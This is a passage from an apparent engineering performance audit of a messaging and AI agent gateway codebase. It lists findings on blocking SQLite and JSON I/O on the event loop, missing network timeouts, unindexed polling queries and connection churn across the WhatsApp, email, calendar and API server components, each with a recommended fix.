- **Description:** process_result runs the handlers in the order of the LLM's JSON keys, and the response schema lists tasks before todos. _handle_tasks runs INSERT INTO wa_tasks/email_tasks (or _handle_escalate inserts into escalations), which opens Python sqlite3's implicit transaction and takes the write lock on the messaging DB. _handle_todos then calls register_todo for each to-do. Each call runs asyncio.run, opens new asyncpg connections (owner resolve, arrival lookup, todo create, announce) and may call push_todo, which makes a Telegram HTTP request with a 10s timeout. stamp_inbox_importance makes more Postgres calls. db.commit() only happens at the end of process_triage_result (triage_agent.py:229, email_triage_agent.py:271, calendar_triage_agent.py:285). The write lock is held for that whole time. The WhatsApp batcher writes to the same DB with PRAGMA busy_timeout=5000. When the lock is held longer than 5s (a slow Supabase connect, a Telegram stall, or several to-dos), the batcher's INSERT raises 'database is locked', and the message is logged and dropped (batcher.py:278-280 returns before registering it). Calendar triage likewise blocks calendar_poller writes.
- **Recommendation:** Split process_result into two phases. Phase 1 does the local SQLite writes and commits right away. Phase 2 does the network side effects (register_todo, stamp_inbox_importance, push_todo) with no transaction open. Alternatively, have the handlers call db.commit() before any network call. On the batcher side, retry 'database is locked' errors instead of dropping the message.

### custom-integrations-2. Email batcher scans the whole email_messages table without an index, including bodies, every 5 seconds — High

- **Location:** `custom/email/email_batcher.py:33-37, custom/email/email_batcher.py:40-67, custom/email/email_batcher.py:125-184, custom/email/email_poller.py:341-350`
- **Effort / confidence:** S / high
- **Description:** get_unbatched_emails runs SELECT * FROM email_messages WHERE batch_id IS NULL ORDER BY received_at on every loop iteration. No index on batch_id exists anywhere in the repo, and email_messages is never pruned. batch_id is stored after body_text/body_html, so SQLite has to read every row and walk the overflow pages of large HTML bodies just to evaluate the predicate. The batcher therefore re-reads the entire mailbox archive about 17k times a day, and CPU and IO grow linearly with mailbox history. In addition, rows still inside the debounce window are fully re-materialized, bodies included, on every pass, and group_emails does a linear scan over existing groups for each email.
- **Recommendation:** Add a partial index: CREATE INDEX idx_email_unbatched ON email_messages(received_at) WHERE batch_id IS NULL. Select only the columns the batcher needs, and load bodies only when writing a batch. Key groups in a dict by sender/thread instead of scanning a list. Optionally add a retention or archive policy for old bodies.

### custom-integrations-3. Calendar triage makes one LLM call for every expanded recurring instance, including past events — High

- **Location:** `custom/calendar/calendar_poller.py:171, custom/calendar/calendar_poller.py:188-191, custom/calendar/calendar_triage_agent.py:125-136, custom/calendar/calendar_triage_agent.py:149-151, custom/calendar/calendar_triage_agent.py:319-335`
- **Effort / confidence:** M / high
- **Description:** The poller requests singleEvents=True over a window from 30 days ago to 365 days ahead, so every recurring series is stored as separate rows: a weekly meeting is about 56 rows and a daily stand-up about 280. Each row is inserted with triaged=0. get_untriaged_events then picks the oldest 10 confirmed events (ORDER BY start_time ASC), and triage_event makes one DeepSeek call per event. On first sync, on account onboarding, or after a series is edited, the agent spends hundreds to thousands of LLM calls classifying identical recurring instances, starting with events that are already over. That costs tokens and delays triage of genuinely new upcoming events, because the queue is processed oldest-first at 10 events every 30 seconds.
- **Recommendation:** Triage at the series level: group rows by recurringEventId and copy the classification to sibling instances. Skip or auto-mark events whose end_time is in the past. Order by start_time >= now first, and only triage within a near-term horizon (for example the next 14-30 days).

### custom-integrations-4. Each inbound item and each to-do opens a new event loop and a new asyncpg connection — Medium

- **Location:** `custom/shared/inbound_registration.py:126, custom/shared/inbound_registration.py:137-190, custom/calendar/calendar_poller.py:322-323, custom/email/email_poller.py:360-361, custom/whatsapp/batcher.py:288-289, custom/shared/todo_registration.py:170-215`
- **Effort / confidence:** M / high
- **Description:** register_item and register_todo each wrap their work in asyncio.run(), and the stores connect on demand, so every changed calendar event, every new email, every WhatsApp message and every to-do pays for a new event loop plus a full Postgres connect (TCP/TLS, auth, server_settings) and teardown. The calendar poller's own comment (calendar_poller.py:250) blames this pattern for a past CPU spike. On first sync, after a series edit, or during a burst in a WhatsApp group, hundreds of these calls run one after another on the ingestion thread, which delays polling and adds connection churn on the shared Supabase pooler.
- **Recommendation:** Give each long-lived worker one persistent event loop (or a background asyncio thread) and a small asyncpg pool. Alternatively, add batch APIs (register_items, register_todos) that reuse one connection for a whole poll pass, the way register_files_batch already does.

### custom-integrations-5. IMAP and Google Calendar calls have no network timeout, so a stalled socket hangs ingestion indefinitely — Medium

- **Location:** `custom/email/email_poller.py:243, custom/email/email_poller.py:279, custom/email/email_poller.py:293, custom/calendar/calendar_poller.py:86`
- **Effort / confidence:** S / high
- **Description:** imaplib.IMAP4_SSL(imap_host, imap_port) is created without a timeout, and gcal_api calls urlopen(req) without one, so both fall back to the default blocking socket with no deadline. Both pollers are single-threaded loops. A half-open TCP connection, which is common after NAT or provider resets, can block SEARCH/FETCH or the Calendar read forever. The process stays alive, so systemd Restart=always never fires, and polling for every account silently stops until someone restarts it manually.
- **Recommendation:** Pass timeout= to IMAP4_SSL (Python 3.9+) and to urlopen, for example 30-60s, and let the existing per-account exception handling retry on the next pass. Consider a watchdog based on the last successful poll time.

### custom-integrations-6. OAuth credential discovery opens a Postgres connection and fetches all credentials for every account on every poll — Medium

- **Location:** `custom/google_oauth.py:31-41, custom/google_oauth.py:84-93, custom/email/email_poller.py:216, custom/calendar/calendar_poller.py:423-439`
- **Effort / confidence:** S / high
- **Description:** credentials_for_email calls store_accounts(service). That runs asyncio.run(store.resolve_for_service(...)), which opens a Supabase connection, resolves the owner, fetches every opted-in credential for the service, and filters by email in Python. It runs once per account per poll (every 60s by default) in both the email and calendar pollers, so N accounts cost N connections and N full credential fetches per minute, even though credentials rarely change.
- **Recommendation:** Resolve the service's credential map once per poll cycle, or cache it with a short TTL (for example 5 minutes). Invalidate the cache on an auth failure or token refresh write-back.

### custom-integrations-7. New-sender contact correlation runs N+1 queries and quadratic fuzzy matching — Medium

- **Location:** `custom/shared/contact_manager.py:72-82, custom/shared/contact_manager.py:109-121, custom/shared/contact_manager.py:260-330`
- **Effort / confidence:** M / high
- **Description:** When an unseen handle arrives, get_all_contacts_with_handles loads every contact and then runs one handle query per contact. Correlation then calls SequenceMatcher-based name_similarity against every candidate, and for high matches re-scans all entries again (line 277). The cost per new sender is O(contacts) queries plus up to O(contacts²) string comparisons, and it runs synchronously inside triage, while the triage transaction holds the SQLite lock.
- **Recommendation:** Load contacts and handles with one JOIN query, or keep a cached normalized-name and email-domain index. Look up exact handle, email and phone matches through indexed queries, and run fuzzy matching only on a short candidate list (same normalized first token or domain).

### custom-integrations-8. IMAP poller reconnects and re-authenticates every 60s and fetches messages one round trip each — Low

- **Location:** `custom/email/email_poller.py:243, custom/email/email_poller.py:279-293, custom/email/email_poller.py:505`
- **Effort / confidence:** M / medium
- **Description:** Each poll pass opens a new IMAP SSL connection and logs in with XOAUTH2 for each account (TLS handshake, auth, SELECT), then runs UID FETCH (RFC822) once per message. That adds handshake and login latency every minute, can trip provider login rate limits, and with up to 50 new messages costs 50 sequential round trips.
- **Recommendation:** Keep the IMAP connection open across passes (reconnect on error), or use IDLE. Fetch new UIDs with one ranged UID FETCH, or fetch headers first and full bodies only when needed.

### custom-integrations-9. Escalation pusher selects all pending rows every 5s with no limit, then does extra lookups per row — Low

- **Location:** `custom/shared/escalation_pusher_v2.py:203-232`
- **Effort / confidence:** S / medium
- **Description:** process_pending_escalations runs SELECT * FROM escalations WHERE status='pending' ORDER BY created_at with no LIMIT every cycle, then formats each row with additional contact and message lookups. The pass stops at the first Telegram failure, so network cost stays bounded. During a Telegram outage, though, the full pending set is re-read and the first row re-formatted every 5s, with no backoff. The escalations schema is not in the repo, so I could not confirm whether status/created_at is indexed.
- **Recommendation:** Add LIMIT (for example 20), an index on escalations(status, created_at), and exponential backoff after a send failure.

### custom-integrations-10. Seminar outreach opens a new Postgres connection for every queue operation and polls when idle — Low

- **Location:** `hermes_cli/seminar_survey.py:363-372, hermes_cli/seminar_survey.py:427-516, hermes_cli/seminar_outreach.py:108-121`
- **Effort / confidence:** S / high
- **Description:** run_forever polls at poll_seconds when idle, and every claim, mark_sent and mark_failed call goes through _connect, which opens and closes its own asyncpg connection. An idle worker opens and closes thousands of connections a day, and each job uses at least two. That is unnecessary backend churn on a Postgres/pooler shared with the agent and the gateway.
- **Recommendation:** Use a long-lived asyncpg connection or a pool of 1-2, reconnecting on failure. Optionally use LISTEN/NOTIFY or idle backoff in place of fixed polling.

### custom-integrations-11. WhatsApp batcher creates a timer thread per message and polls the bridges every second — Low

- **Location:** `custom/whatsapp/batcher.py:67, custom/whatsapp/batcher.py:372-395, custom/whatsapp/batcher.py:404-435`
- **Effort / confidence:** M / medium
- **Description:** Each incoming message cancels the existing threading.Timer for its batch key and starts a new one, so a busy group chat creates one OS thread per message. _pending_batches has no limit on the number of keys or the size of a batch. Each bridge is also polled with GET /messages every POLL_INTERVAL_SEC (default 1s) even when the queue is empty.
- **Recommendation:** Replace the per-key Timers with one flush loop over a deadline map, and cap messages per batch. Use adaptive backoff or long polling against the bridge when the queue is empty.

### custom-integrations-12. Calendar sync collects every page in memory before processing and writes one statement per event — Low

- **Location:** `custom/calendar/calendar_poller.py:160, custom/calendar/calendar_poller.py:214, custom/calendar/calendar_poller.py:226-260`
- **Effort / confidence:** S / high
- **Description:** sync_events appends every page's full event JSON to all_events before it processes anything, then runs one SELECT per event followed by an individual UPDATE/INSERT and attendee DELETE/INSERT. A full 395-day sync of a busy calendar keeps the whole result set in memory and holds the SQLite write lock for many statement-level operations. Steady-state delta syncs are small, so the impact is limited to full syncs.
- **Recommendation:** Process and commit each page as it arrives, and batch the existence lookups (one SELECT ... WHERE google_event_id IN (...) per page).

## gateway-core

The gateway has useful safeguards: raw config parsing is cached, the agent cache is capped at 128 with a 1h idle TTL, AsyncSessionDB offloads SQLite calls to threads, and inbound work is serialized per session with a global semaphore. However, the SessionStore facade (sessions.json persistence plus SQLite transcript/peer writes) is called synchronously from async handlers. No session_store call in run.py is wrapped in asyncio.to_thread. So every message does full-file JSON serialization with fsync, plus SQLite reads and writes whose lock-retry path can sleep on the event loop. Other work grows with transcript length, queue backlog, number of approved users, number of routing entries, or number of boards. Locally, one _save() with 1,000 routing entries (about 1 MB of JSON) took about 23 ms including fsync, and it runs at least twice per message.

**Strengths:** AsyncSessionDB wraps synchronous SessionDB methods in asyncio.to_thread for the agent-facing DB handle.; Agent cache is bounded (_AGENT_CACHE_MAX_SIZE=128) with LRU plus a 1h idle-TTL eviction.; Config raw YAML parsing uses an mtime/size keyed cache.; InboundDispatcher serializes each session and bounds cross-session concurrency with a semaphore.; SessionDB writes use BEGIN IMMEDIATE with jittered retry and a short 1s busy timeout to avoid convoys (good for threads, but see the finding about calling it on the loop).; Kanban notifier dedupes board slugs that resolve to the same DB path.

### gateway-core-1. sessions.json full serialization and fsync runs synchronously on the event loop, multiple times per message — High

- **Location:** `gateway/session.py:1128-1160, gateway/session.py:1420-1562, gateway/session.py:1593-1612, gateway/run.py:10352, gateway/run.py:11590`
- **Effort / confidence:** M / high
- **Description:** SessionStore._save() rebuilds the full routing map with to_dict(), json.dump(indent=2)s it, then flush()es and os.fsync()s it while holding the store's threading lock. get_or_create_session() (run.py:10352, at the start of every turn) and update_session() (run.py:11590, at the end of every turn, to store last_prompt_tokens) both call _save() directly from async code; no SessionStore call in run.py uses asyncio.to_thread. In a local benchmark, 1,000 entries produced about 1 MB of JSON and each _save took about 23 ms on local disk. The cost grows linearly with routing entries, which accumulate across DMs, groups, and threads until expiry, and fsync latency adds more under disk pressure. Every message from every chat pays this cost at least twice, stalling every other adapter and stream on the loop.
- **Recommendation:** Make the routing index write-behind: mark it dirty and let a single debounced writer (asyncio task + to_thread) flush it every N ms and on shutdown. Skip fsync for metadata-only changes such as updated_at and last_prompt_tokens, drop indent=2, and keep atomic os.replace. Alternatively, move routing entries into the existing SQLite sessions table, which already stores session_key and peer columns.

### gateway-core-2. Synchronous SQLite writes with retry/sleep loops run on the event loop via SessionStore — High

- **Location:** `hermes_state.py:929-931, hermes_state.py:985, hermes_state.py:1355-1420, hermes_state.py:1909-1941, gateway/session.py:1257-1281, gateway/session.py:1593-1612, gateway/session.py:1917, gateway/run.py:11460-11590`
- **Effort / confidence:** M / high
- **Description:** update_session() calls _record_gateway_session_peer(), which issues an UPDATE through SessionDB._execute_write. append_to_transcript() is called up to five times per turn (run.py:11460, 11525, 11551, 11557, 11582) and also writes to SQLite unless skip_db is set. _execute_write runs BEGIN IMMEDIATE with a 1s sqlite busy timeout and up to 15 retries, each followed by time.sleep(20-150 ms). state.db is shared with the agent thread, kanban workers, cron, and the dashboard/agent-home processes on the same box, so write-lock contention is realistic. On the event loop that means a worst case of seconds of total gateway freeze per call, and routinely a few ms per write.
- **Recommendation:** Route SessionStore DB operations through asyncio.to_thread, or give the store an async facade like AsyncSessionDB. Skip record_gateway_session_peer when the peer tuple hasn't changed (cache the last value per session_id). Batch each turn's transcript appends into one transaction.

### gateway-core-3. Full transcript is loaded and JSON-decoded on the event loop before every turn — High

- **Location:** `gateway/run.py:10573, gateway/session.py:1993-2005, hermes_state.py:4187-4223`
- **Effort / confidence:** L / high
- **Description:** Each inbound turn calls session_store.load_transcript() synchronously (no to_thread). It SELECTs every active message row and decodes each one (content/tool_calls JSON) into dicts, even when a cached AIAgent with a current message-count snapshot will be reused. CPU, allocation, and SQLite I/O grow linearly with conversation length on every message and block the loop. The hygiene/compression checks then walk the full list again. run.py:11714 does another full load on a later path.
- **Recommendation:** At minimum, wrap the load in asyncio.to_thread. Better, reuse the cached agent's in-memory history when the coherence snapshot (message_count) matches, and otherwise load only the delta since the snapshot. Keep full loads for reset, compression, and recovery. Add metrics for transcript row count and load latency.

### gateway-core-4. Per-session inbound deques are unbounded with no overload policy — High

- **Location:** `gateway/inbound.py:244-249`
- **Effort / confidence:** M / high
- **Description:** submit() creates a deque per session key and appends every event without a maxlen, byte budget, expiry, or producer backpressure. _drain() handles events serially and holds a semaphore slot while awaiting the handler. A slow provider, a stuck tool, or a flood (for example, a busy group chat) lets payloads and media metadata pile up indefinitely, and memory grows across sessions on a shared single box.
- **Recommendation:** Add configurable per-session and global caps (event count and bytes). On overflow, coalesce consecutive text events from the same sender or reject/defer with a user-visible acknowledgement, and emit metrics on queue depth. Make sure entries are dropped on session reset and shutdown.

### gateway-core-5. Routing lock is held across a synchronous SQLite probe and _save() — Medium

- **Location:** `gateway/session.py:1324-1350, gateway/session.py:1475-1516, hermes_state.py:2580-2587`
- **Effort / confidence:** M / high
- **Description:** For an existing key, get_or_create_session() calls _is_session_ended_in_db() → SessionDB.get_session() while holding self._lock, and the same critical section can call _save() (JSON plus fsync). Background threads also take this lock: for example, the session-split path at run.py:18014-18015 calls _save() from the agent worker thread. When that happens, the event loop blocks on a threading.Lock until the other thread's DB read or fsync finishes, which serializes unrelated chats.
- **Recommendation:** Snapshot the entry under the lock, run the ended-session probe outside it (or cache ended state, invalidated on end_session), and keep lock-held work limited to dict mutation, with persistence handed to the debounced writer.

### gateway-core-6. Rich-sent index does a full JSON read/sort/write per record and a full parse per lookup — Medium

- **Location:** `gateway/rich_sent_store.py:39-70`
- **Effort / confidence:** M / high
- **Description:** record() reads the whole rich_sent_index.json, inserts one key, sorts the entire dict once it exceeds 1,000 entries, re-serializes everything, and replaces the file. lookup() re-reads and parses the whole file. Both are synchronous and run on Telegram/WhatsApp send and reply paths. Concurrent writers also read-modify-write the same file, so updates can be lost.
- **Recommendation:** Keep a process-local OrderedDict LRU loaded once and guarded by a lock, and persist it via a debounced background write. Or use a small indexed SQLite table keyed by (chat_id, message_id) with TTL eviction.

### gateway-core-7. Pairing authorization re-reads and linearly scans the approved-users JSON on every inbound check — Medium

- **Location:** `gateway/pairing.py:250-256, gateway/authz_mixin.py:432`
- **Effort / confidence:** S / high
- **Description:** is_approved() calls _load_json() on the approved file for every authorization check, then compares the sender against every approved ID in a loop. Inbound authz runs this per message, so every message pays a synchronous file read, a JSON parse, and an O(approved users) scan on the loop.
- **Recommendation:** Cache the parsed approved set keyed by file mtime/size, invalidate it explicitly in approve/revoke, and use set membership on normalized IDs. Fall back to a scan only for platforms that need alias matching.

### gateway-core-8. Kanban notifier opens every board DB on a fixed 5s cadence even when idle — Medium

- **Location:** `gateway/kanban_watchers.py:195-249, gateway/kanban_watchers.py:581-584`
- **Effort / confidence:** M / high
- **Description:** Every 5 seconds, the notifier enumerates active boards, opens a fresh SQLite connection per resolved DB (repeating the connection pragmas), lists subscriptions, and claims unseen events, even with zero subscriptions or no changes. Cost scales with board count and adds constant disk wakeups and WAL read-lock churn that competes with kanban workers on the same host.
- **Recommendation:** Skip boards with no subscriptions before connecting, and reuse a read connection per DB path. Use an adaptive idle backoff (for example, 5s → 60s) or a cheap change marker (max event id or file mtime) to skip unchanged boards. Record tick duration.

### gateway-core-9. Mirror session lookup re-parses and scans the entire sessions.json per call — Low

- **Location:** `gateway/mirror.py:96-145`
- **Effort / confidence:** S / high
- **Description:** _find_session_id() opens sessions.json, json.loads it, and linearly scans every entry to match platform/chat/thread/user on each mirror call (cron and tool-sent messages). That is about 1 MB of parse work per call at 1,000 routes, done synchronously.
- **Recommendation:** Use SessionDB.find_latest_gateway_session_for_peer (an indexed SQL lookup) as the primary path, or an mtime-keyed in-process index keyed by (platform, chat_id, thread_id, user_id).

## gateway-platforms

In production the hot adapters are the two WhatsApp bridge adapters, the app (agent-home push) delivery channel, and the api_server if it is enabled. agent-home's BFF talks to the dashboard on :9119 (agent-home/src/lib/env.ts:60), not to api_server. The main problem is that synchronous SQLite (SessionDB / ResponseStore) work runs directly on the single gateway asyncio loop: api_server session handlers, app-channel delivery (which opens a new SessionDB, runs full schema init and does a TRUNCATE checkpoint on every send), and the Responses store. Because SessionDB serialises on a threading.Lock that agent worker threads also take, and occasionally runs FTS optimize or WAL TRUNCATE inside that lock, these calls can stall every platform at once: WhatsApp polling, SSE keepalives and typing loops. The api_server streaming paths also park a default-executor thread per stream to poll a queue.Queue, and agent runs share that same small pool. WhatsApp adds a fixed 5 s debounce plus a 1 s poll to every inbound text, which is the largest user-visible latency in this area. Prompt caching is preserved on the api_server path: a fresh AIAgent per turn reloads the stored system prompt from SessionDB, and per-turn UI context goes into the user message.

**Strengths:** Prompt caching is preserved on the api_server path even though a fresh AIAgent is built per turn: conversation_loop restores the stored system_prompt from SessionDB (agent/conversation_loop.py:308-333), the ephemeral system prompt is added at call time and never persisted, and agent-home puts uiContext into the user message (agent-home/src/app/api/chat/stream/route.ts:123), not the system prompt.; Agent turns run off the event loop (run_in_executor / asyncio.to_thread), and pywebpush's blocking webpush() is pushed to a thread (plugins/platforms/app/push.py:138).; In-memory caches are bounded: _IdempotencyCache has TTL + LRU (api_server.py:634-676), webhook _seen_deliveries / _delivery_info are pruned on a deque (webhook.py:284-340), MS Graph receipts use a capped deque+set (msgraph_webhook.py:343-351), email _seen_uids is trimmed, and api_server run streams/statuses are swept by _sweep_orphaned_runs.; Long-lived adapters share tuned httpx keep-alive limits (gateway/platforms/_http_client_limits.py) to avoid fd exhaustion.; SessionDB uses WAL, short busy timeouts with jittered app-level retry, periodic checkpoint and FTS optimize, plus write-contention accounting, so contention can be measured.; Inbound media is size-capped (validate_inbound_media_size) and image/document caches are purged every 24 h by the gateway runner.; Streaming SSE responses set X-Accel-Buffering: no and Cache-Control: no-cache, and Responses-API text deltas are batched every 50 ms (api_server.py:2696-2716) to cut write syscalls.

### gateway-platforms-1. WhatsApp inbound text waits a fixed 5 s quiet period (plus up to 1 s poll) before the agent sees it — Medium

- **Location:** `plugins/platforms/whatsapp/adapter.py:442-447, plugins/platforms/whatsapp/adapter.py:1279-1324, plugins/platforms/whatsapp/adapter.py:1264`
- **Effort / confidence:** S / high
- **Description:** Every TEXT event goes through _enqueue_text_event, and _flush_text_batch sleeps _text_batch_delay_seconds before dispatch. The default is 5.0 s, or 10 s when the last chunk is 6000 chars or more. Each new message cancels and restarts the timer. On top of that, the bridge is drained by a fixed 1 s poll. So every ordinary one-line WhatsApp message gets about 5-6 s of added latency before the agent even starts, and a user who sends several short messages pushes dispatch out further. WhatsApp is the main production messaging surface (two bridges). Other adapters use 0.6 s for the same mechanism (plugins/platforms/discord/adapter.py:769, plugins/platforms/wecom/adapter.py:190), and the base adapter's busy-text debounce is 0.35 s.
- **Recommendation:** Lower the default text_batch_delay_seconds to around 0.6-1.0 s to match the other adapters, keeping the longer delay only for the split-message case (last_len >= _SPLIT_THRESHOLD). Optionally make the delay adaptive: flush immediately when no further message arrives within one poll cycle.

### gateway-platforms-2. App-channel delivery opens a new SessionDB (full schema init + TRUNCATE checkpoint) synchronously on the gateway event loop for every message — Medium

- **Location:** `plugins/platforms/app/deliver.py:60-67, plugins/platforms/app/adapter.py:50-59, hermes_state.py:993-1009, hermes_state.py:1470-1483, hermes_state.py:1577-1631`
- **Effort / confidence:** S / high
- **Description:** AppHomeAdapter.send is a coroutine on the gateway loop and awaits deliver_to_topic. deliver_to_topic then, with no executor, constructs SessionDB(), which connects, applies the WAL pragma and runs _init_schema: executescript(SCHEMA_SQL), _reconcile_columns (which parses the schema in a separate in-memory SQLite), DEFERRED_INDEX_SQL and the schema_version check. It then runs get_session, get_session_by_title, append_message (a BEGIN IMMEDIATE write that can sleep in time.sleep() jitter retries for up to 15 x 150 ms, each attempt with a 1 s busy timeout) and close(), which runs PRAGMA wal_checkpoint(TRUNCATE). TRUNCATE has to wait for readers and blocks other writers. All of this freezes the event loop that also serves both WhatsApp pollers, the api_server and the typing loops. Cron fan-out to the app channel multiplies the cost.
- **Recommendation:** Reuse one long-lived SessionDB per process, either cached on the adapter or shared with the gateway runner, instead of constructing and closing one per delivery. Run the DB section (resolve_topic, append_message, get_session) via await asyncio.to_thread(...). Drop the per-call close()/TRUNCATE checkpoint.

### gateway-platforms-3. api_server session and history handlers run synchronous SQLite on the event loop, contending with agent threads on the same SessionDB lock — Medium

- **Location:** `gateway/platforms/api_server.py:1408-1423, gateway/platforms/api_server.py:1441, gateway/platforms/api_server.py:1556, gateway/platforms/api_server.py:1586-1601, gateway/platforms/api_server.py:1932, gateway/platforms/api_server.py:1104, hermes_state.py:1357-1420, hermes_state.py:6048-6060`
- **Effort / confidence:** M / medium
- **Description:** These handlers all call SessionDB directly inside async aiohttp handlers: _get_existing_session_or_404, _conversation_history_for_session (get_messages_as_conversation over the whole transcript, with JSON decode and sanitize_context per row), list_sessions_rich (a recursive-CTE list), get_messages, fork (get_messages + replace_messages of the full transcript), create/patch/delete, and the chat-completions history load. The same SessionDB instance is passed to every agent built by _create_agent (api_server.py:1104), and every read and write takes self._lock (a threading.Lock). So the event-loop thread blocks whenever an agent worker thread is mid-write: up to the 1 s busy timeout per attempt, plus the jittered time.sleep retries, which run in the loop thread when the loop is the writer. Every 50th write runs wal_checkpoint(TRUNCATE) and every 1000th runs FTS5 'optimize' under the same lock (hermes_state.py:1397-1401, 1423-1470, 6049). Whichever thread trips the counter pays for it, including the event loop, and optimize on a large messages_fts index can take seconds. While the loop is blocked, all adapters on it stall.
- **Recommendation:** Wrap the SessionDB calls in these handlers in await asyncio.to_thread(...), or use a small dedicated DB executor. Run _try_wal_checkpoint and _try_optimize_fts in a background maintenance thread instead of inline on whichever caller trips the counter. Consider a separate read-only SessionDB connection for list and get endpoints so reads do not queue behind the writer lock.

### gateway-platforms-4. Streaming endpoints park a default-executor thread per stream to poll a queue.Queue, and agent runs share the same small pool — Medium

- **Location:** `gateway/platforms/api_server.py:1954-1966, gateway/platforms/api_server.py:2229, gateway/platforms/api_server.py:2722, gateway/platforms/api_server.py:3069-3077, gateway/platforms/api_server.py:3882, gateway/platforms/api_server.py:4156`
- **Effort / confidence:** M / high
- **Description:** The /v1/chat/completions and /v1/responses streaming paths feed deltas through a thread-safe queue.Queue. The SSE writer then repeatedly calls loop.run_in_executor(None, lambda: stream_q.get(timeout=0.5)), which holds a thread from the loop's default ThreadPoolExecutor for each poll. _run_agent (3882) and /v1/runs (4156) submit the agent turn to the same default executor (None). On Python 3.11+ that pool is min(32, cpu+4) = 12 threads on the 8-vCPU CX43, and other default-executor users share it, such as the email IMAP poll (plugins/platforms/email/adapter.py:646). Each concurrent streaming request therefore uses two threads, and a handful of parallel streams plus tool calls can exhaust the pool, so new turns and IMAP polls queue. Each stream also wakes a thread at least every 0.5 s for the whole run (sometimes many minutes).
- **Recommendation:** Use an asyncio.Queue and have the agent callbacks push with loop.call_soon_threadsafe(q.put_nowait, delta), as _handle_session_chat_stream already does (api_server.py:1691-1701). Then the SSE writer awaits q.get() with no thread at all. Separately, run agent turns on a dedicated, explicitly sized executor (as GatewayRunner._get_executor does, gateway/run.py:14456) instead of the shared default.

### gateway-platforms-5. WhatsApp adapter busy-polls each bridge every second, and the bridge silently drops messages beyond 100 — Low

- **Location:** `plugins/platforms/whatsapp/adapter.py:1229-1264, scripts/whatsapp-bridge/bridge.js:228-230, scripts/whatsapp-bridge/bridge.js:560-565, scripts/whatsapp-bridge/bridge.js:605-610`
- **Effort / confidence:** M / high
- **Description:** _poll_messages does GET /messages and then asyncio.sleep(1) forever. /messages returns immediately even when the queue is empty (bridge.js:605-606). With two production bridges that is about 2 HTTP round-trips per second, around 170k per day, which costs CPU in both the Python and Node processes and adds up to 1 s of latency. The bridge queue is capped at MAX_QUEUE_SIZE = 100 with shift() dropping the oldest. So if the gateway loop is stalled (see the event-loop-blocking findings) or the poll errors and backs off 5 s during a burst such as a group-chat flood, inbound messages are lost with no signal.
- **Recommendation:** Make /messages a long-poll: hold the request until a message arrives or about 25 s pass (a per-request waiter resolved on messageQueue.push). Drop the fixed sleep. Alternatively push inbound to the gateway over a local websocket or webhook. Log, or expose in /health, a counter when the bridge drops queued messages.

### gateway-platforms-6. Web-push fan-out is sequential per device, and each delivery re-fetches the full push config (including the VAPID private key) over a fresh HTTP client — Low

- **Location:** `plugins/platforms/app/push.py:49-73, plugins/platforms/app/push.py:83-89, plugins/platforms/app/push.py:101-153`
- **Effort / confidence:** S / high
- **Description:** Every send_push call opens a new httpx.AsyncClient and GETs /api/notifications/config from the agent-home BFF. That route reads the enrollment from Supabase Storage. The subscriptions are then pushed one at a time: each webpush() is a blocking TLS request to the browser push service, run serially in to_thread. Dead-subscription cleanup opens yet another client. Delivery latency therefore grows linearly with enrolled devices, and every cron or app message costs an extra BFF to Supabase Storage round trip.
- **Recommendation:** Cache the push config in-process for a short TTL (for example 60 s) and invalidate it on 404/410. Reuse one AsyncClient. Fan out with asyncio.gather over to_thread(webpush, ...), using a small concurrency cap.

### gateway-platforms-7. /api/sessions/{id}/messages and fork return or copy the entire transcript with no pagination — Low

- **Location:** `gateway/platforms/api_server.py:1545-1561, gateway/platforms/api_server.py:1594-1595, hermes_state.py:3865-3897`
- **Effort / confidence:** M / medium
- **Description:** _handle_session_messages calls db.get_messages(resolved_id), which runs SELECT * with no LIMIT, decodes every row, and serialises the whole result into one JSON response on the loop thread. That includes large tool payloads and reasoning fields. The response has no limit or before/after cursor and no compression. _handle_fork_session copies the full transcript the same way. For long-lived sessions this is many MB per call and blocks the loop while it builds. Impact depends on whether any production client uses this endpoint; agent-home uses the dashboard's equivalent route, not api_server.
- **Recommendation:** Add limit and before_id/after_id query parameters (defaulting to the last N messages), select only the columns that are rendered, and run the query in a thread. Enable aiohttp response compression for large JSON (resp.enable_compression()).

### gateway-platforms-8. ResponseStore stores the full conversation history per response, writes on every read, and counts rows on every put, all synchronously on the event loop — Low

- **Location:** `gateway/platforms/api_server.py:446-468, gateway/platforms/api_server.py:470-500, gateway/platforms/api_server.py:2472-2477, gateway/platforms/api_server.py:3218-3223`
- **Effort / confidence:** M / medium
- **Description:** Each /v1/responses turn calls put() with conversation_history set to the full history so far. A chain of N turns therefore stores O(N^2) messages in total (capped at 100 rows, but each row can be large), and each put JSON-dumps the whole history. put() also runs SELECT COUNT(*) and commits. get() runs UPDATE accessed_at and commits, so every read is a write. All of this is synchronous sqlite3 on the aiohttp loop thread.
- **Recommendation:** Store only the per-response delta plus a previous_response_id pointer, or a session_id reference to SessionDB, and rebuild history on demand. Track the row count in memory or evict with a single DELETE ... WHERE response_id NOT IN (SELECT ... ORDER BY accessed_at DESC LIMIT ?). Make the accessed_at touch best-effort and batched. Move store I/O to asyncio.to_thread.

### gateway-platforms-9. Webhook GitHub-comment delivery runs `gh` via blocking subprocess.run on the event loop (30 s timeout) — Low

- **Location:** `gateway/platforms/webhook.py:963-976`
- **Effort / confidence:** S / high
- **Description:** _deliver_github_comment is async but calls subprocess.run([...'gh','pr','comment'...], timeout=30). This blocks the entire gateway loop for the duration of the gh process, which means process start, auth and a GitHub API round-trip: typically 1-3 s, and up to 30 s on network trouble. Every adapter stalls in the meantime.
- **Recommendation:** Use await asyncio.create_subprocess_exec(...) with asyncio.wait_for(proc.communicate(), 30), or wrap the existing call in asyncio.to_thread.

### gateway-platforms-10. Email adapter opens a new IMAP TLS connection and logs in on every 15 s poll — Low

- **Location:** `plugins/platforms/email/adapter.py:443, plugins/platforms/email/adapter.py:632-664`
- **Effort / confidence:** M / medium
- **Description:** _poll_loop calls _check_inbox every EMAIL_POLL_INTERVAL (default 15 s). Each call creates imaplib.IMAP4_SSL, then runs login, ID, select and a UID SEARCH UNSEEN. That is a full TCP and TLS handshake plus auth about 5,760 times a day per mailbox, which risks provider throttling and holds a default-executor thread (shared with the api_server agent runs; see the executor finding) for each round.
- **Recommendation:** Keep one authenticated IMAP connection and reconnect only on error. Use IMAP IDLE where the server supports it, falling back to polling with NOOP between searches.

## infra-supply-chain

